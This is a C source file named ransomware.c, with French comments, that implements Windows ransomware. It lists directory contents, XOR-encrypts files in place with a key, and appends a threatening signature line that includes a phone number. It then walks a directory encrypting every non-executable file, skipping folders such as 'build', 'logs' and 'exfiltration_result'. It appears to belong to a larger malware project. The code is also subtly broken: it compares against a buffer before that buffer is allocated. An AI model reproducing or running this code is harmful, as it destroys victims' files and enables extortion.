/**
 * @file ransomware.c
 * @brief Implémentation des fonctions de ransomware
 * @author Valentin Pizzio
 * @date 21/12/2024
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include "ransomware.h"
#include "protocol.h"

// Signature pour marquer les fichiers chiffrés
static const char signature[] = "ENCRYPTED";
static const size_t sig_len = sizeof(signature) - 1;

/**
 * @brief Liste les fichiers et répertoires dans un dossier
 * 
 * @param buffer Buffer pour stocker la liste des fichiers
 * @param buffer_size Taille du buffer
 * @param directory Chemin du dossier à lister
 */
void list_files_for_ransomware(char* buffer, size_t buffer_size, const char* directory) {
    WIN32_FIND_DATA fd;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    char search_path[MAX_PATH];
    int count = 1;

    buffer[0] = '\0';
    char line[256];

    // Construit le chemin de recherche
    if (directory && strcmp(directory, "") != 0) {
        snprintf(search_path, sizeof(search_path), "..\\%s\\*", directory);
    } else {
        snprintf(search_path, sizeof(search_path), "..\\*");
    }
    hFind = FindFirstFile(search_path, &fd);

    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            // Liste les répertoires et les fichiers
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                if (strcmp(fd.cFileName, ".") != 0 && strcmp(fd.cFileName, "..") != 0 &&
                    strcmp(fd.cFileName, "build") != 0 && strcmp(fd.cFileName, "logs") != 0) {
                    snprintf(line, sizeof(line), "%d. [DIR] %s\n", count++, fd.cFileName);
                    strncat(buffer, line, buffer_size - strlen(buffer) - 1);
                }
            } else {
                snprintf(line, sizeof(line), "%d. %s\n", count++, fd.cFileName);
                strncat(buffer, line, buffer_size - strlen(buffer) - 1);
            }
        } while (FindNextFile(hFind, &fd) != 0 && strlen(buffer) < buffer_size - 100);
        FindClose(hFind);
    }
}

/**
 * @brief Chiffre un fichier avec une clé
 * 
 * @param filename Chemin du fichier à chiffrer
 * @param key Clé de chiffrement
 * @return 1 si le fichier est chiffré avec succès, 0 sinon
 */
int encrypt_file(const char* filename, const char* key) {
    FILE* file;
    long file_size;
    unsigned char* buffer;
    size_t key_len = strlen(key);

    // Ouvre le fichier en lecture/écriture binaire
    file = fopen(filename, "rb+");
    if (!file) {
        printf("Error: Cannot open file %s for reading\n", filename);
        return 0;
    }

    // Obtient la taille du fichier
    fseek(file, 0, SEEK_END);
    file_size = ftell(file);
    fseek(file, 0, SEEK_SET);

    // Vérifie si le fichier est déjà chiffré
    const char* signature = "\nRendez-vous tous ou ce sera la guerre - By TR - tel : 04.22.52.10.10\n";
    size_t sig_len = strlen(signature);
    if (file_size >= sig_len && memcmp(buffer + file_size - sig_len, signature, sig_len) == 0) {
        printf("File %s is already encrypted\n", filename);
        fclose(file);
        return 0;
    }

    // Alloue le buffer pour le contenu du fichier
    buffer = (unsigned char*)malloc(file_size);
    if (!buffer) {
        fclose(file);
        return 0;
    }

    // Lit le contenu du fichier
    fread(buffer, 1, file_size, file);

    // Chiffre le contenu avec la clé
    for (long i = 0; i < file_size; i++) {
        buffer[i] ^= key[i % key_len];
    }

    // Ajoute la signature
    unsigned char* new_buffer = (unsigned char*)malloc(file_size + sig_len);
    if (!new_buffer) {
        free(buffer);
        fclose(file);
        return 0;
    }
    memcpy(new_buffer, buffer, file_size);
    free(buffer);
    memcpy(new_buffer + file_size, signature, sig_len);

    // Écrit le contenu chiffré
    fseek(file, 0, SEEK_SET);
    fwrite(new_buffer, 1, file_size + sig_len, file);
    free(new_buffer);
    fclose(file);
    return 1;
}

/**
 * @brief Chiffre les fichiers dans un dossier
 * 
 * @param directory Chemin du dossier à chiffrer
 * @param key Clé de chiffrement
 * @return Nombre de fichiers chiffrés
 */
int ransomware_directory(const char* directory, const char* key) {
    WIN32_FIND_DATA fd;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    char search_path[MAX_PATH];
    int encrypted_count = 0;

    printf("Encrypting directory: %s\n", directory);

    if (directory && strcmp(directory, "") != 0) {
        snprintf(search_path, sizeof(search_path), "%s\\*", directory);
    } else {
        snprintf(search_path, sizeof(search_path), "*");
    }

    hFind = FindFirstFile(search_path, &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        printf("Error: Cannot find directory %s\n", directory);
        return encrypted_count;
    }

    do {
        // Skip special directories
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) {
            continue;
        }

        // Skip protected directories
        if (strcmp(fd.cFileName, "build") == 0 || 
            strcmp(fd.cFileName, "logs") == 0 || 
            strcmp(fd.cFileName, "exfiltration_result") == 0) {
            continue;
        }

        // Skip executable files
        if (strstr(fd.cFileName, ".exe") || strstr(fd.cFileName, ".dll")) {
            continue;
        }

        char full_path[MAX_PATH];
        if (directory && strcmp(directory, "") != 0) {
            snprintf(full_path, sizeof(full_path), "%s\\%s", directory, fd.cFileName);
        } else {
            snprintf(full_path, sizeof(full_path), "%s", fd.cFileName);
        }

        // Only encrypt files, not directories
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            if (encrypt_file(full_path, key)) {
                printf("Encrypted: %s\n", full_path);
                encrypted_count++;
            }
        }
    } while (FindNextFile(hFind, &fd) != 0);

    FindClose(hFind);
    return encrypted_count;
}
